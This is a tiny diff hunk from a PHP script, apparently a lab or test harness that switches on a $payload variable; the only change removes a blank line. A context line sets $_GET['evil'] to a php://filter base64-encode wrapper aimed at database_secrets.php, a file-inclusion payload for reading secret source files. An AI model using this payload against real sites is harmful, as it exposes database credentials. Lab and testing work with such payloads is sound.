@@ -19,7 +19,6 @@ switch ($payload){
 
 		$_GET["evil"] = "php://filter/convert.base64-encode/resource=database_secrets.php";
 
-
 	break;
 
 	case 3:
